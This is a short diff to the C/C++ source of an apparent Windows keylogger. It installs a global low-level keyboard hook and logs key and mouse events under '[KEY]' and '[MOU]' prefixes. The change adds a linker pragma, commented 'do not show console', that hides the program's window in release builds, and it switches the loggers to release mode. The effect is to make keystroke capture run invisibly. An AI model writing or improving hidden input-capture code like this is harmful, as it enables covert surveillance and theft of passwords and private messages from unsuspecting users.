@@ -218,11 +218,20 @@ LRESULT CALLBACK keyboardProc(int n_code, WPARAM w_param, LPARAM l_param) {
     }
     return CallNextHookEx(NULL, n_code, w_param, l_param);
 }
+#ifndef DEBUG
+//不显示控制台
+#pragma comment(linker,"/subsystem:windows /entry:mainCRTStartup")
+#endif
 int main() {
-    mouse_logger.setDebug();
     mouse_logger.setHead("[MOU] ");
-    keyboard_logger.setDebug();
     keyboard_logger.setHead("[KEY] ");
+#ifndef DEBUG
+    mouse_logger.setRelease();
+    keyboard_logger.setRelease();
+#else
+    mouse_logger.setDebug();
+    keyboard_logger.setDebug();
+#endif
     // 安装全局键盘钩子
     HHOOK h_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
     // 消息循环
